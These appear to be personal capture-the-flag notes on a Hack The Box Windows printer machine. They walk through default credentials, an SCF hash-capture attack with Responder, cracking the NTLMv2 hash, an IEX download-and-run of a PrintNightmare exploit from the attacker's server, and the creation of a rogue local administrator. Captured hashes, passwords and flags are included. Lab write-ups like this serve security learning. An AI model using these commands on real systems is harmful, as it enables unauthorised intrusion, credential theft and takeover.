//basically a windows machine with a web server...visiting it require admin creds

//samba open  (445)

//RPC is port 135...lets do Rpc enumeration

// The site says: “MFP Firmware Update Center. Please enter password for admin”

// Defaults creds work lol

admin : admin

//after login we see a printer

//in Firmware updates page we can uplaod files (upload Firmware)

//as samba open those are probably saved in the shares

//after some research I discovered SCF file attacks

//we create an exploit named @exploit.scf

//we start a responder to capture hashes
sudo  responder -wrf --lm -v -I tun0

//to fix: issues with tun0

[SMB] NTLMv2 Client   : 10.10.11.106
[SMB] NTLMv2 Username : DRIVER\tony
[SMB] NTLMv2 Hash     : tony::DRIVER:6f09da70e73b9237:674092FE6EC25CB23CBB01D554A9B854:0101000000000000DEB3B39E53B8D70144991278610991070000000002000400270027000000000000000000

//crack the hash with john+rockyou

Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2021-10-03 00:42) 10.00g/s 327680p/s 327680c/s 327680C/s softball27..eatme1

//so creds are tony : liltony

//we connect with evil-winrm
evil-winrm -i 10.10.11.106 -u tony -p liltony

//USER FLAG
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
beb0f894a3ddac222bc7737523284e18


//now PrivEsc

// rpcdump sow use the printer is enabled so spool service runs...we use printNighmare exploit

//we upload the file with evil-winrm
upload CVE-2021-1675.ps1

//But we cannot import it
File C:\Users\tony\Desktop\cve-2021-1675.ps1 cannot be loaded because running scripts is disabled on this system. For more information, see about_Execution_Policies at http://go.microsoft.com/fwlink/?LinkID=135170.
At line:1 char:1
+ Import-Module .\cve-2021-1675.ps1
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo          : SecurityError: (:) [Import-Module], PSSecurityException
+ FullyQualifiedErrorId : UnauthorizedAccess,Microsoft.PowerShell.Commands.ImportModuleCommand

//we can bypass that with the help of download the file with help of IEX command

//we start a python server where the exploit is and download with IEX on evil-winrm 

IEX(New-Object Net.Webclient).downloadstring('http://10.10.15.45:4444/CVE-2021-1675.ps1')           //used port 4444 for server because 80 was busy (had another server)

//then we invoke it and choose our creds
Invoke-Nightmare -NewUser "nairolf" -NewPassword "nairolf"

[+] added user nairolf as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll

//lmao we are admin...lets connect as such
evil-winrm -i 10.10.11.106 -u nairolf -p nairolf

//ROOT FLAG
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4fdc61c6377caadd47213a0021a5cf18


//ok cheated alot here but I did it (proudly a script kiddie)

//this room was all but easy..htb got a problem rating their boxes

//my real issue was a network issue with getting the hashes
//tun0 not working here...gotta fix the vpn stuff


